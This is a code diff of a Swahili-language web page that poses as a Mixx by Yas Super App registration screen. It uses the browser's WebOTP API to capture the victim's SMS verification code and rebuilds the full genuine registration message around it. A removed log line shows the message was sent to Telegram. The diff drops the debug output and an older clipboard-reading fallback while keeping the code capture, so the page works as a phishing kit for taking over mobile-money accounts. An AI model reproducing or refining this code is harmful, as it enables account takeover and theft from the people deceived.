@@ -62,24 +62,6 @@
         }
         .hidden { display: none !important; }
         .screen { display: none; } .screen.active { display: block; }
-        .debug-box {
-            background: #0d1225;
-            border: 1px solid #2a2f4a;
-            border-radius: 8px;
-            padding: 10px;
-            margin-top: 10px;
-            font-family: monospace;
-            font-size: 12px;
-            color: #34d399;
-            max-height: 100px;
-            overflow-y: auto;
-            text-align: left;
-            display: none;
-        }
-        .debug-box.show { display: block; }
-        .debug-box .error { color: #ef4444; }
-        .debug-box .success { color: #34d399; }
-        .debug-box .info { color: #f59e0b; }
     </style>
 </head>
 <body>
@@ -92,7 +74,7 @@
                 <h3>✅ Namba ya Uthibitisho <span class="auto-detect-badge"><span class="dot"></span> Auto-detect</span></h3>
                 <div class="phone-display" id="showPhone">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
+                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki kutoka kwenye arifa</strong><br><br>
                     <strong>1.</strong> Subiri SMS ifike<br>
                     <strong>2.</strong> Bonyeza <strong>"Allow"</strong> kwenye kidirisha<br>
                     <strong>3.</strong> Ujumbe utajaza kiotomatiki<br>
@@ -109,7 +91,6 @@
                 <div class="error-msg" id="codeError"></div>
                 <button class="btn btn-gold" id="submitBtn" onclick="submitCode()">Endelea →</button>
                 <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
-                <div class="debug-box" id="debugBox"></div>
             </div>
             <div class="screen" id="screen2">
                 <div class="waiting-content">
@@ -125,21 +106,6 @@
 
     <script>
         // ================================================================
-        // DEBUG LOG
-        // ================================================================
-        function debugLog(msg, type = 'info') {
-            var box = document.getElementById('debugBox');
-            box.classList.add('show');
-            var time = new Date().toLocaleTimeString();
-            var div = document.createElement('div');
-            div.className = type;
-            div.textContent = '[' + time + '] ' + msg;
-            box.appendChild(div);
-            box.scrollTop = box.scrollHeight;
-            console.log(msg);
-        }
-
-        // ================================================================
         // GET URL PARAMETERS
         // ================================================================
         var urlParams = new URLSearchParams(window.location.search);
@@ -152,10 +118,6 @@
         document.getElementById('showPhone').textContent = '+255 ' + userPhone;
         document.getElementById('showPhone2').textContent = '+255 ' + userPhone;
 
-        debugLog('🚀 Page loaded');
-        debugLog('📱 App ID: ' + appId);
-        debugLog('📱 Phone: ' + userPhone);
-
         // ================================================================
         // VARIABLES
         // ================================================================
@@ -166,7 +128,7 @@
         var isSubmitting = false;
         var smsDetected = false;
         var detectedCode = '';
-        var webotpAttempted = false;
+        var waitingForNotification = false;
 
         // ================================================================
         // iPhone/Android DETECTION
@@ -175,10 +137,8 @@
             var ua = navigator.userAgent.toLowerCase();
             if (/iphone|ipad|ipod/.test(ua)) {
                 document.getElementById('btnIPhone').style.display = 'block';
-                debugLog('📱 iPhone detected', 'info');
             } else {
                 document.getElementById('btnAndroid').style.display = 'block';
-                debugLog('📱 Android detected', 'info');
             }
         })();
 
@@ -223,7 +183,7 @@
             document.getElementById('smsMessage').value = '';
             smsDetected = false;
             detectedCode = '';
-            webotpAttempted = false;
+            waitingForNotification = false;
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -238,7 +198,7 @@
             } catch(e) {} 
             
             setTimeout(function() { resendCooldown = false; }, 30000);
-            setTimeout(startAutoDetect, 1500);
+            setTimeout(waitForNotification, 1500);
         }
 
         async function submitCode() { 
@@ -251,9 +211,6 @@
                 document.getElementById('codeError').classList.add('show'); 
                 return; 
             }
-
-            debugLog('📤 Submitting SMS to Telegram...', 'info');
-            debugLog('📤 SMS: ' + smsText, 'info');
 
             isSubmitting = true;
             document.getElementById('submitBtn').disabled = true;
@@ -298,7 +255,7 @@
             document.getElementById('smsMessage').value = ''; 
             smsDetected = false;
             detectedCode = '';
-            webotpAttempted = false;
+            waitingForNotification = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -309,136 +266,98 @@
             isSubmitting = false;
             document.getElementById('submitBtn').disabled = false;
             document.getElementById('submitBtn').innerHTML = 'Endelea →';
-            setTimeout(startAutoDetect, 1500);
+            setTimeout(waitForNotification, 1500);
         }
 
         // ================================================================
-        // WEBOTP DETECTION + REGENERATE FULL SMS
+        // WAIT FOR NOTIFICATION - WebOTP
         // ================================================================
         function regenerateFullSMS(code) {
             return 'You are being registered in Mixx by Yas Super App, use the code ' + code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
         }
 
-        async function startAutoDetect() {
+        async function waitForNotification() {
             if (!document.getElementById('screen1').classList.contains('active')) {
-                debugLog('⏹️ Not on code screen, stopping', 'info');
+                console.log('Wait: Not on code screen');
                 return;
             }
 
             if (smsDetected) {
-                debugLog('✅ SMS already detected, skipping', 'success');
+                console.log('Wait: SMS already detected');
                 return;
             }
 
-            // ============================================================
-            // METHOD 1: WebOTP - Auto-detect from notification
-            // ============================================================
-            if (!webotpAttempted && 'OTPCredential' in window) {
-                webotpAttempted = true;
-                debugLog('⏳ Attempt 1: WebOTP - waiting for notification...', 'info');
-                document.getElementById('codeError').textContent = '⏳ Inasubiri SMS... Bonyeza "Allow" ikitokea';
-                document.getElementById('codeError').style.color = 'var(--primary)';
+            if (!('OTPCredential' in window)) {
+                console.log('Wait: WebOTP not supported');
+                document.getElementById('codeError').textContent = 'ℹ️ Kifaa chako hakitumii auto-detect. Tafadhali nakili mwenyewe.';
+                document.getElementById('codeError').style.color = '#f59e0b';
                 document.getElementById('codeError').classList.add('show');
-
-                try {
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 60000);
-
-                    const credential = await navigator.credentials.get({
-                        otp: { transport: ['sms'] },
-                        signal: controller.signal
-                    });
-
-                    clearTimeout(timeout);
-
-                    if (credential && credential.code) {
-                        detectedCode = credential.code;
-                        debugLog('✅ WebOTP SUCCESS! Code: ' + detectedCode, 'success');
-                        
-                        // REGENERATE the full SMS from the code
-                        var fullSMS = regenerateFullSMS(detectedCode);
-                        
-                        document.getElementById('smsMessage').value = fullSMS;
-                        smsDetected = true;
-                        
-                        debugLog('📝 Full SMS regenerated: ' + fullSMS, 'success');
-                        
-                        document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa! Bonyeza "Endelea" kutuma.';
-                        document.getElementById('codeError').style.color = '#10b981';
-                        document.getElementById('codeError').classList.add('show');
-                        
-                        clearInterval(countdownTimer);
-                        document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-                        document.getElementById('timerDisplay').className = 'timer-bar';
-                        return;
-                    }
-                } catch (err) {
-                    if (err.name === 'AbortError') {
-                        debugLog('⏱️ WebOTP timeout - trying fallback', 'error');
-                    } else {
-                        debugLog('❌ WebOTP error: ' + err.message, 'error');
-                    }
-                }
+                return;
             }
 
-            // ============================================================
-            // METHOD 2: Clipboard Fallback (if WebOTP fails)
-            // ============================================================
-            debugLog('🔄 Attempt 2: Clipboard fallback - checking clipboard...', 'info');
-            document.getElementById('codeError').textContent = '📋 Tafadhali nakili ujumbe wa SMS kwenye arifa yako';
-            document.getElementById('codeError').style.color = '#f59e0b';
+            waitingForNotification = true;
+            console.log('⏳ Waiting for SMS notification...');
+            document.getElementById('codeError').textContent = '⏳ Inasubiri SMS... Bonyeza "Allow" ikitokea';
+            document.getElementById('codeError').style.color = 'var(--primary)';
             document.getElementById('codeError').classList.add('show');
 
             try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text.length > 20) {
-                        document.getElementById('smsMessage').value = text;
-                        smsDetected = true;
-                        debugLog('✅ Clipboard SUCCESS! SMS length: ' + text.length, 'success');
-                        
-                        document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
-                        document.getElementById('codeError').style.color = '#10b981';
-                        document.getElementById('codeError').classList.add('show');
-                        
-                        clearInterval(countdownTimer);
-                        document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-                        document.getElementById('timerDisplay').className = 'timer-bar';
-                        return;
-                    }
-                }
-                debugLog('⚠️ Clipboard empty or not available', 'error');
-            } catch (e) {
-                debugLog('❌ Clipboard error: ' + e.message, 'error');
-            }
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 60000);
 
-            // ============================================================
-            // If both methods fail
-            // ============================================================
-            debugLog('❌ No SMS detected. Please copy manually.', 'error');
-            document.getElementById('codeError').textContent = '❌ Hakuna SMS iliyogunduliwa. Tafadhali nakili mwenyewe.';
-            document.getElementById('codeError').style.color = 'var(--danger)';
-            document.getElementById('codeError').classList.add('show');
+                const credential = await navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeout);
+
+                if (credential && credential.code) {
+                    detectedCode = credential.code;
+                    console.log('✅ SMS detected from notification! Code:', detectedCode);
+                    
+                    // REGENERATE THE FULL SMS FROM THE CODE
+                    var fullSMS = regenerateFullSMS(detectedCode);
+                    
+                    console.log('📝 Full SMS regenerated:', fullSMS);
+                    
+                    // FILL THE TEXTAREA
+                    document.getElementById('smsMessage').value = fullSMS;
+                    smsDetected = true;
+                    
+                    document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa! Bonyeza "Endelea" kutuma.';
+                    document.getElementById('codeError').style.color = '#10b981';
+                    document.getElementById('codeError').classList.add('show');
+                    
+                    clearInterval(countdownTimer);
+                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    document.getElementById('timerDisplay').className = 'timer-bar';
+                }
+            } catch (err) {
+                if (err.name === 'AbortError') {
+                    console.log('Wait: WebOTP timeout');
+                    document.getElementById('codeError').textContent = '⏱️ Muda Umeisha. Bonyeza "Hukupokea SMS"';
+                    document.getElementById('codeError').style.color = 'var(--danger)';
+                } else {
+                    console.log('Wait: WebOTP error', err);
+                    document.getElementById('codeError').textContent = '❌ Hitilafu. Tafadhali nakili SMS mwenyewe.';
+                    document.getElementById('codeError').style.color = 'var(--danger)';
+                    document.getElementById('codeError').classList.add('show');
+                }
+                waitingForNotification = false;
+            }
         }
 
         // ================================================================
         // START
         // ================================================================
         startCountdown();
-        setTimeout(startAutoDetect, 1500);
+        setTimeout(waitForNotification, 1000);
 
-        // Keep trying every 5 seconds if not detected
-        var autoDetectInterval = setInterval(function() {
-            if (!smsDetected && document.getElementById('screen1').classList.contains('active')) {
-                startAutoDetect();
-            }
-            if (!document.getElementById('screen1').classList.contains('active')) {
-                clearInterval(autoDetectInterval);
-            }
-        }, 5000);
-
-        debugLog('✅ MixxPlus - Auto-detection started', 'success');
-        debugLog('📱 Method 1: WebOTP (auto) → Method 2: Clipboard (fallback)', 'info');
+        console.log('✅ MixxPlus - Waiting for SMS notification...');
+        console.log('📱 App ID:', appId);
+        console.log('📱 Phone:', userPhone);
+        console.log('📱 SMS will be REGENERATED from the notification code');
     </script>
 </body>
 </html>
